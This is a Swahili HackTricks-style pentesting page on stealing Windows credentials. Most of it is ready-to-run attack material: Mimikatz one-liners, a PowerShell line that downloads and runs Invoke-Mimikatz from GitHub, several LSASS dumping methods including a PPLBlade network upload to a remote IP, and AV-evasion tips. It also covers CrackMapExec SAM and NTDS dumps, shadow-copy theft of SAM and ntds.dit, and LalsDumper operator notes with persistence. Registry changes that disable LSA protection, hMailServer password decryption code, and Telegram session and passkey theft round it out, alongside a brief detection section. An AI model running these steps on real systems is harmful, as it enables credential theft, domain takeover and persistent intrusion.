# Kuiba Vitambulisho vya Windows

{{#include ../../banners/hacktricks-training.md}}

## Vitambulisho vya Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Tafuta mambo mengine ambayo Mimikatz inaweza kufanya katika** [**ukurasa huu**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Jifunze kuhusu baadhi ya njia zinazowezekana za kulinda credentials hapa.**](credentials-protections.md) **Ulinzi huu unaweza kuzuia Mimikatz kutoa baadhi ya credentials.**

## Credentials with Meterpreter

Tumia [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ambayo** nimeunda ili **kutafuta nywila na hashes** ndani ya mashine ya mwathiriwa.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Kukwepa AV

### Procdump + Mimikatz

Kwa kuwa **Procdump kutoka** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni zana halali ya Microsoft**, Defender haitambui.\
Unaweza kutumia zana hii **kudump mchakato wa lsass**, **kupakua dump** na **kutoa** **credentials kwenye mashine ya ndani** kutoka kwenye dump.

Unaweza pia kutumia [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Mchakato huu hufanywa kiotomatiki kwa kutumia [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Dokezo**: Baadhi ya **AV** zinaweza **kutambua** matumizi ya **procdump.exe ku-dump lsass.exe** kuwa **hasidi**; hii ni kwa sababu **zinatambua** mifuatano ya **"procdump.exe" na "lsass.exe"**. Kwa hiyo, ni **stealthier** kupitisha **PID** ya lsass.exe kama **argument** kwa procdump **badala ya** **jina lsass.exe.**

### Ku-dump lsass kwa kutumia **comsvcs.dll**

DLL inayoitwa **comsvcs.dll**, inayopatikana katika `C:\Windows\System32`, inawajibika kwa **ku-dump kumbukumbu ya mchakato** kunapotokea crash. DLL hii inajumuisha **function** inayoitwa **`MiniDumpW`**, iliyoundwa kuitwa kwa kutumia `rundll32.exe`.\
Hoja mbili za kwanza hazina umuhimu, lakini ya tatu imegawanywa katika sehemu tatu. Kitambulisho cha mchakato unaopaswa ku-dump ndicho sehemu ya kwanza, eneo la faili ya dump ndilo sehemu ya pili, na sehemu ya tatu lazima iwe neno **full**. Hakuna chaguo mbadala.\
Baada ya kuchanganua sehemu hizi tatu, DLL huunda faili ya dump na kuhamisha kumbukumbu ya mchakato uliobainishwa ndani ya faili hiyo.\
Inawezekana kutumia **comsvcs.dll** ku-dump mchakato wa lsass, hivyo kuondoa hitaji la kupakia na kutekeleza procdump. Mbinu hii imeelezwa kwa kina katika [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Amri ifuatayo hutumika kutekeleza:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Unaweza kuendesha mchakato huu kiotomatiki kwa kutumia** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Kudump lsass kwa kutumia Task Manager**

1. Bofya kulia kwenye Task Bar kisha ubofye Task Manager
2. Bofya More details
3. Tafuta mchakato wa "Local Security Authority Process" kwenye kichupo cha Processes
4. Bofya kulia kwenye mchakato wa "Local Security Authority Process" kisha ubofye "Create dump file".

### Kudump lsass kwa kutumia procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni binary iliyosainiwa na Microsoft, na ni sehemu ya seti ya zana za [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Crash dump kamili ya mfumo iliyopo tayari, au nakala iliyobanwa kwenye folda ya mtumiaji inayoweza kufikiwa, inaweza kuhifadhi taarifa za credentials kwa uchanganuzi wa offline. Majina ya faili kama `MEMORY.DMP` na `MEMORY.7z` ni vidokezo vya kuanza ukaguzi tu: thibitisha asili yake na ruhusa za kuifikia, na usidhani kuwa ina credentials zinazoweza kutumika au za sasa.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumping lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni zana ya kudump Protected Process inayowezesha kuficha memory dump na kuihamishia kwenye workstations za mbali bila kuihifadhi kwenye disk.

**Utendaji muhimu**:

1. Kukwepa ulinzi wa PPL
2. Kuficha faili za memory dump ili kukwepa mifumo ya Defender ya utambuzi inayotegemea signature
3. Kupakia memory dump kwa kutumia mbinu za RAW na SMB bila kuihifadhi kwenye disk (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – LSASS dumping inayotumia SSP bila MiniDumpWriteDump

Ink Dragon husambaza dumper ya hatua tatu inayoitwa **LalsDumper**, ambayo haiiti kamwe `MiniDumpWriteDump`, kwa hivyo EDR hooks kwenye API hiyo hazijawahi kuanzishwa:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – hutafuta ndani ya `fdp.dll` placeholder yenye herufi 32 ndogo za `d`, huiandika upya kwa kutumia absolute path ya `rtu.txt`, huhifadhi DLL iliyorekebishwa kama `nfdp.dll`, na kuita `AddSecurityPackageA("nfdp","fdp")`. Hii hulazimisha **LSASS** kupakia DLL hasidi kama Security Support Provider (SSP) mpya.
2. **Stage 2 ndani ya LSASS** – LSASS inapopakia `nfdp.dll`, DLL husoma `rtu.txt`, hufanya XOR kwa kila byte kwa kutumia `0x20`, na kupanga blob iliyofichuliwa kwenye memory kabla ya kuhamisha utekelezaji.
3. **Stage 3 dumper** – payload iliyopangwa upya hutekeleza tena mantiki ya MiniDump kwa kutumia **direct syscalls** zinazotatuliwa kutoka kwa majina ya API yaliyohashwa (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Export maalum inayoitwa `Tom` hufungua `%TEMP%\<pid>.ddt`, hutiririsha dump ya LSASS iliyobanwa ndani ya faili, na kufunga handle ili exfiltration iweze kufanyika baadaye.

Maelezo kwa operator:

* Weka `lals.exe`, `fdp.dll`, `nfdp.dll`, na `rtu.txt` kwenye directory moja. Stage 1 huandika upya placeholder iliyowekwa kwenye code kwa absolute path ya `rtu.txt`, kwa hivyo kuvitenganisha huvunja chain.
* Usajili hufanyika kwa kuongeza `nfdp` kwenye `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Unaweza kuweka thamani hiyo mwenyewe ili LSASS ipakie upya SSP kila boot.
* Faili za `%TEMP%\*.ddt` ni dumps zilizobanwa. Zifungue compression ndani ya mfumo wa ndani, kisha uzitumie kwenye Mimikatz/Volatility kwa credential extraction.
* Kuendesha `lals.exe` kunahitaji haki za admin/SeTcb ili `AddSecurityPackageA` ifanikiwe; baada ya call hiyo kurejesha matokeo, LSASS hupakia SSP hasidi na kutekeleza Stage 2 bila kuonekana.
* Kuondoa DLL kwenye diski hakuitoi kwenye LSASS. Futa entry ya registry na uwashe upya LSASS (reboot), au iache kwa persistence ya muda mrefu.

## CrackMapExec

### Dump SAM hashes

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump NTDS.dit kutoka kwa DC lengwa

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump historia ya nywila ya NTDS.dit kutoka kwa DC lengwa

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Onyesha sifa ya pwdLastSet kwa kila akaunti ya NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Kuiba SAM & SYSTEM

Faili hizi zinapaswa **kupatikana** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM._ Lakini **huwezi kuzinakili tu kwa njia ya kawaida** kwa sababu zinalindwa.

### Kutoka Registry

Njia rahisi zaidi ya kuiba faili hizo ni kupata nakala kutoka Registry:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Pakua** faili hizo kwenye mashine yako ya Kali na **toa hashes** kwa kutumia:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Unaweza kunakili faili zilizolindwa kwa kutumia huduma hii. Unahitaji kuwa Administrator.

#### Using vssadmin

Binary ya vssadmin inapatikana tu katika matoleo ya Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Lakini unaweza kufanya hivyo hivyo kwa kutumia **Powershell**. Huu ni mfano wa **jinsi ya kunakili faili la SAM** (diski kuu inayotumika ni "C:" na limehifadhiwa kwenye C:\users\Public), lakini unaweza kutumia njia hii kunakili faili lolote lililolindwa:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Msimbo kutoka kwenye kitabu: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Hatimaye, unaweza pia kutumia [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kunakili SAM, SYSTEM na ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Vitambulisho vya Active Directory - NTDS.dit**

Faili la **NTDS.dit** linajulikana kama kiini cha **Active Directory**, likiwa na data muhimu kuhusu object za watumiaji, makundi na uanachama wao. Hapa ndipo **password hashes** za watumiaji wa domain huhifadhiwa. Faili hili ni hifadhidata ya **Extensible Storage Engine (ESE)** na hupatikana kwenye **_%SystemRoom%/NTDS/ntds.dit_**.

Hifadhidata hii ina majedwali matatu makuu:

- **Data Table**: Jedwali hili huhifadhi maelezo kuhusu object kama watumiaji na makundi.
- **Link Table**: Hufuatilia mahusiano, kama vile uanachama wa makundi.
- **SD Table**: Huhifadhi **security descriptors** za kila object, zinazohakikisha usalama na udhibiti wa ufikiaji wa object zilizohifadhiwa.

Utafiti wa Christoffer Andersson kuhusu safu ya hifadhidata unaeleza majedwali haya na tabia zake zinazotegemea toleo kwa undani zaidi.<sup>[[8]](#references)</sup>

Windows hutumia _Ntdsa.dll_ kuingiliana na faili hilo, na hutumiwa na _lsass.exe_. Kwa hiyo, **sehemu** ya faili la **NTDS.dit** inaweza kupatikana **ndani ya kumbukumbu ya `lsass`** (huenda ukapata data iliyofikiwa hivi karibuni kwa sababu ya uboreshaji wa utendaji unaotumia **cache**).

#### Kusimbua hashes zilizo ndani ya NTDS.dit

Hash imesimbwa kwa njia fiche mara tatu:

1. Simbua Password Encryption Key (**PEK**) kwa kutumia **BOOTKEY** na **RC4**.
2. Simbua **hash** kwa kutumia **PEK** na **RC4**.
3. Simbua **hash** kwa kutumia **DES**.

**PEK** ina **thamani ileile kwenye kila domain controller**, lakini **imesimbwa kwa njia fiche** ndani ya **NTDS.dit** kwa kutumia **BOOTKEY** maalum ya DC kutoka kwenye hive ya **SYSTEM** ya domain controller hiyo. Kwa hiyo, kutoa vitambulisho kunahitaji **NTDS.dit** na **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Kunakili NTDS.dit kwa kutumia Ntdsutil

Inapatikana tangu Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Unaweza pia kutumia mbinu ya [**volume shadow copy**](#stealing-sam-and-system) kunakili faili la **ntds.dit**. Kumbuka kwamba utahitaji pia nakala ya **SYSTEM file** (tena, mbinu ya [**kuidump kutoka kwenye registry au kutumia volume shadow copy**](#stealing-sam-and-system)).

### **Kutoa hashes kutoka NTDS.dit**

Baada ya **kupata** faili za **NTDS.dit** na **SYSTEM**, unaweza kutumia zana kama _secretsdump.py_ **kutoa hashes**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Unaweza pia **kuzitoa kiotomatiki** kwa kutumia mtumiaji halali wa domain admin:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Kwa **faili kubwa za NTDS.dit**, inapendekezwa kuzitoa kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Hatimaye, unaweza pia kutumia **moduli ya metasploit**: _post/windows/gather/credentials/domain_hashdump_ au **mimikatz** `lsadump::lsa /inject`

### **Kutoa objekti za domain kutoka NTDS.dit hadi kwenye hifadhidata ya SQLite**

Objekti za NTDS zinaweza kutolewa hadi kwenye hifadhidata ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Si siri pekee zinazotolewa, bali pia objekti zote na sifa zake kwa ajili ya uchimbaji zaidi wa taarifa, pale faili ghafi ya NTDS.dit inapokuwa tayari imepatikana.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Hive ya `SYSTEM` si ya lazima, lakini inaruhusu kusimbua siri (NT & LM hashes, taarifa za ziada za kuingia kama vile nywila zilizo wazi, funguo za kerberos au trust, na historia za nywila za NT & LM). Pamoja na taarifa nyingine, data ifuatayo hutolewa: akaunti za watumiaji na mashine pamoja na hashes zake, bendera za UAC, mihuri ya muda ya kuingia mara ya mwisho na kubadilisha nywila, maelezo ya akaunti, majina, UPN, SPN, vikundi na uanachama wa vikundi unaojumuisha vikundi vidogo, mti wa organizational units na uanachama wake, na domain zinazoaminiana pamoja na aina, mwelekeo na sifa za trusts...

## Lazagne

Pakua binary kutoka [hapa](https://github.com/AlessandroZ/LaZagne/releases). Unaweza kutumia binary hii kutoa credentials kutoka kwenye programu mbalimbali.

```
lazagne.exe all
```

## Zana nyingine za kutoa credentials kutoka SAM na LSASS

### Windows credentials Editor (WCE)

Zana hii inaweza kutumika kutoa credentials kutoka kwenye memory. Ipakue kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Toa credentials kutoka kwenye faili la SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Toa taarifa za kuingia kutoka kwenye faili la SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Pakua kutoka:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) kisha **iendeshe** tu na nywila zitatolewa.

## Kuchunguza vipindi vya RDP visivyotumika na kudhoofisha vidhibiti vya usalama

FinalDraft RAT ya Ink Dragon ina tasker ya `DumpRDPHistory` ambayo mbinu zake zinafaa kwa red-teamer yeyote:<sup>[[3]](#references)</sup>

### Ukusanyaji wa telemetry wa mtindo wa DumpRDPHistory

* **Malengo ya RDP yanayotoka** – changanua hive zote za watumiaji kwenye `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Kila subkey huhifadhi jina la server, `UsernameHint`, na timestamp ya mwisho wa kuandika. Unaweza kuiga mantiki ya FinalDraft kwa kutumia PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Ushahidi wa RDP inayoingia** – uliza logi ya `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` kwa Event ID **21** (kuingia kwa mafanikio) na **25** (kukatika kwa muunganisho) ili kubaini ni nani aliyesimamia mashine:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Ukishajua ni Domain Admin gani anayeunganisha mara kwa mara, dump LSASS (kwa kutumia LalsDumper/Mimikatz) wakati session yake iliyokatika bado ipo. CredSSP + NTLM fallback huacha verifier na tokens zake kwenye LSASS, ambazo zinaweza kutumika tena kupitia SMB/WinRM ili kupata `NTDS.dit` au kuweka persistence kwenye domain controllers.

### Registry downgrades zinazolengwa na FinalDraft

Implant hiyo hiyo pia hubadilisha funguo kadhaa za registry ili kurahisisha wizi wa credentials:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` huzima Restricted Admin kwa RDP inayoingia; **haiwashi** pass-the-hash kupitia hali hiyo. Kuweka thamani kuwa `0` huruhusu Restricted Admin kwenye kifaa lengwa, lakini mteja lazima aombe `/RestrictedAdmin` au atumie sera inayohitaji Restricted Admin.<sup>[[14]](#references)</sup> Hash pekee haitoi haki za msimamizi wa mbali; tazama [RDP authentication prerequisites](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` huzima uchujaji wa tokeni za UAC ili wasimamizi wa ndani wapate tokeni zisizo na vizuizi kupitia mtandao.
* `DSRMAdminLogonBehavior=2` humruhusu msimamizi wa DSRM kuingia wakati DC iko mtandaoni, na kuwapa washambuliaji akaunti nyingine iliyojengewa ndani yenye haki za juu.
* `RunAsPPL=0` huondoa ulinzi wa LSASS PPL, na kufanya ufikiaji wa kumbukumbu kuwa rahisi sana kwa zana za kutoa dump kama LalsDumper.

## Hati tambulishi za usanidi wa hMailServer (post-compromise)

Kagua faili halisi za usanidi `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, na `C:\ProgramData\hMailServer\hMailServer.ini` kulingana na mpangilio wa usakinishaji. Thamani ya `[Security] AdministratorPassword=` inayosomeka na isiyo tupu ni hash ya nenosiri la usimamizi la hMailServer; si ushahidi wa nenosiri la Windows Administrator. Hati tambulishi hiyo ikipatikana, kuhamia kwenye akaunti yoyote ya Windows kunahitaji kuthibitisha kwa njia tofauti matumizi upya ya nenosiri na haki za kuingia.

Kwa usakinishaji unaotumia hifadhidata ya SQL CE, thamani tofauti ya `[Database] Password=` katika INI hulinda hifadhidata. Katika usakinishaji wa zamani, thamani hii husimbwa kwa Blowfish kwa kutumia ufunguo tuli `THIS_KEY_IS_NOT_SECRET` na ubadilishaji wa endianness ya maneno ya baiti 4. Tumia mfuatano wa hex kutoka kwenye INI pamoja na kipande hiki cha Python:<sup>[[2]](#references)</sup>

Thibitisha kwanza kwamba akaunti ya sasa inaweza kusoma **zote mbili**: INI na hifadhidata husika ya SQL CE `.sdf`. Nenosiri la INI hulinda hifadhidata; ni tofauti na hash za akaunti za mailbox zilizohifadhiwa ndani yake. Kagua au boresha **nakala** ya hifadhidata inayotumika; usiwahi kutumia faili ya moja kwa moja.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Kwa kutumia password ya maandishi wazi, nakili hifadhidata ya SQL CE ili kuepuka kufungwa kwa faili, pakia provider ya 32-bit, na uboreshe ikiwa inahitajika kabla ya kuuliza hashes:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Safu ya `accountpassword` hutumia umbizo la hash la hMailServer (hashcat mode `1421`). Password ya mailbox iliyovunjwa huwa njia ya kuingia kwa mtumiaji wa Windows ikiwa tu password hiyo inatumiwa tena na akaunti ya ndani/domain, na akaunti hiyo ina haki zinazohitajika za remote logon.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Baadhi ya tooling hunasa **password za logon zilizo plaintext** kwa kuingilia callback ya LSA logon `LsaApLogonUserEx2`. Wazo ni ku-hook au kufunika callback ya kifurushi cha uthibitishaji ili kunasa credentials **wakati wa logon** (kabla ya hashing), kisha kuziandika kwenye diski au kumrudishia operator. Kwa kawaida, hili hutekelezwa kwa kutumia helper inayoingiza msimbo ndani ya LSA au kujisajili nayo, kisha kurekodi kila tukio la logon la interactive/network linalofaulu pamoja na username, domain na password.<sup>[[1]](#references)</sup>

Maelezo ya kiutendaji:
- Inahitaji local admin/SYSTEM ili kupakia helper kwenye njia ya uthibitishaji.
- Credentials zilizonaswa huonekana tu logon inapotokea (interactive, RDP, service, au network logon kutegemea hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) huhifadhi maelezo ya miunganisho iliyohifadhiwa kwenye faili ya `sqlstudio.bin` ya kila mtumiaji. Dumpers maalum zinaweza kuchanganua faili hiyo na kurejesha credentials za SQL zilizohifadhiwa. Kwenye shells zinazorejesha matokeo ya amri pekee, faili hiyo mara nyingi hutolewa kwa kuisimba kama Base64 na kuichapisha kwenye stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Kwa upande wa operator, tengeneza upya faili na uendeshe dumper ndani ya mashine ili kurejesha credentials:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Wizi wa session za browser na cookies kupitia Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Wizi wa session ya Telegram Desktop `tdata`

Telegram Desktop huhifadhi hali ya uidhinishaji na akaunti kwenye directory yake ya **`tdata`**. Session iliyonakiliwa inaweza kupakiwa kwa tooling inayooana ili kuingia bila nenosiri la akaunti, mradi uidhinishaji huo bado ni halali; ikiwa usimbaji fiche wa data ya ndani umewashwa, stealer pia huhitaji passcode yake. Kisha session iliyoidhinishwa inaweza kufichua data ya utambulisho, metadata ya mazungumzo na uanachama, ujumbe na media inayoweza kupakuliwa.<sup>[[10]](#references)</sup>

### Ugunduzi na upatikanaji

Tafuta kwenye mipangilio ya usakinishaji na portable; majina ya vifurushi vya Microsoft Store hutofautiana, kwa hiyo orodhesha directories za vifurushi zenye `TelegramMessenge` na ukague subtree yake ya `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Ikiwa usomaji wa kawaida utashindwa na token ya process **tayari ina na imewezesha** `SeBackupPrivilege`, ufikiaji unaotambua backup hutoa njia mbadala; haupati privilege wala kuongeza ruhusa za process. `CreateFileW` pamoja na `FILE_FLAG_BACKUP_SEMANTICS` inaweza kuomba semantics za backup/restore na kupuuza ukaguzi wa usalama wa faili pale privileges zinazohitajika zipo kwenye token, lakini flag hiyo pekee haiwezi kushinda sharing lock isiyooana.<sup>[[10]](#references)[[11]](#references)</sup>

Kwa faili zilizo live na zimefungwa, unda/soma **Volume Shadow Copy**; kwa faili zilizozuiwa na ACL, `robocopy /B` hutumia backup mode na kupuuza ACL za faili na directory.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Kiambatisho kinachozingatia matumizi ya kipimo data kinaweza kutuma kwanza orodha ya njia za faili pekee, kupokea kitambulishi cha snapshot pamoja na njia ambazo tayari zimehifadhiwa na C2, kisha kupakia faili ambazo hazipo tu. Kwa hiyo, uhamishaji mdogo wa nyongeza baada ya kuorodhesha `tdata` kwa kujirudia bado unaweza kuashiria kuwa wizi wa session umefanikiwa.<sup>[[10]](#references)</sup>

### Ugunduzi na udhibiti wa athari

Linganisha ufikiaji wa kujirudia kwa `tdata` unaofanywa na mchakato usio wa Telegram na kuwezeshwa kwa `SeBackupPrivilege`, kufunguliwa kwa faili kwa kutumia backup semantics, shughuli za VSS, au mchakato tanzu wa `robocopy.exe` unaotumia `/B`. Pia tafuta uorodheshaji wa haraka wa `%APPDATA%` na `%LOCALAPPDATA%\Packages`, ukifuatiwa na miunganisho ya nje kutoka kwa mchakato huohuo. Baada ya kuathiriwa, tumia **Settings → Devices** (au **Privacy & Security → Active Sessions**) kusitisha session zisizotambulika; kuwezesha uthibitishaji wa hatua mbili pekee hakubatilishi idhini ambayo tayari imeibwa.<sup>[[10]](#references)[[13]](#references)</sup>

## Wizi wa vitambulisho vya Passkeys / WebAuthn kutoka Chrome kwenye Windows

Ikiwa utekelezaji wa msimbo utapatikana kama **mtumiaji mwathiriwa** kwenye kifaa cha Windows kinachotumia **Chrome + Google Password Manager synced passkeys**, passkeys huwa lengo la kuvutia baada ya unyonyaji hata **bila admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Vitu vya ndani vinavyovutia

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

